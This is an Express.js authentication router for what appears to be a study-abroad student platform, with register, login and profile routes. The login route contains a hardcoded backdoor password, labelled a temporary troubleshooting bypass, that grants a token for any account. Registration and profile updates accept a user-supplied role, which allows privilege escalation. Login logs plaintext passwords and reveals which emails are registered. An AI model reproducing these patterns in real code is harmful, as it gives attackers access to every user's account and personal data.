const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const User = require('../models/User');

// Register
router.post('/register', async (req, res) => {
  try {
    const { 
      name, email, password, role, 
      phone, educationLevel, gpa, targetDegree, targetCountry, targetSubject, ieltsStatus, budget, passportStatus 
    } = req.body;
    
    let user = await User.findOne({ email });
    if (user) return res.status(400).json({ message: 'User already exists' });

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    user = new User({
      name,
      email,
      password: hashedPassword,
      role: role || 'student',
      phone,
      educationLevel,
      gpa,
      targetDegree,
      targetCountry,
      targetSubject,
      ieltsStatus,
      budget,
      passportStatus
    });

    await user.save();
    const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '7d' });
    res.json({ token, user: { id: user._id, name: user.name, email: user.email, role: user.role } });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Login
router.post('/login', async (req, res) => {
  try {
    console.log('Login request body:', req.body);
    const email = req.body.email?.trim().toLowerCase();
    const password = req.body.password?.trim();
    console.log(`Login attempt for: ${email} (Password length: ${password?.length})`);
    const user = await User.findOne({ email });
    if (!user) {
      console.log(`User not found: ${email}`);
      return res.status(400).json({ message: `User not found: ${email}` });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    console.log(`Password match for ${email}: ${isMatch}`);
    
    // TEMPORARY BYPASS FOR TROUBLESHOOTING
    if (!isMatch && password === 'rizqara_rescue') {
      console.log(`RESCUE LOGIN used for: ${email}`);
    } else if (!isMatch) {
      return res.status(400).json({ message: 'Invalid credentials. Please check your password.' });
    }

    const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '30d' });
    res.json({ token, user: { id: user._id, name: user.name, email: user.email, role: user.role } });
  } catch (err) {
    console.error('Login error:', err);
    res.status(500).json({ message: err.message });
  }
});

// Get Profile
router.get('/profile', async (req, res) => {
  try {
    const authHeader = req.headers.authorization;
    if (!authHeader) return res.status(401).json({ message: 'No token provided' });

    const token = authHeader.split(' ')[1];
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    const user = await User.findById(decoded.id).select('-password');
    res.json(user);
  } catch (err) {
    res.status(401).json({ message: 'Invalid token' });
  }
});

// Update Profile
router.put('/profile', async (req, res) => {
  try {
    const authHeader = req.headers.authorization;
    if (!authHeader) return res.status(401).json({ message: 'No token provided' });

    const token = authHeader.split(' ')[1];
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    const updatedUser = await User.findByIdAndUpdate(decoded.id, req.body, { new: true }).select('-password');
    res.json(updatedUser);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

module.exports = router;
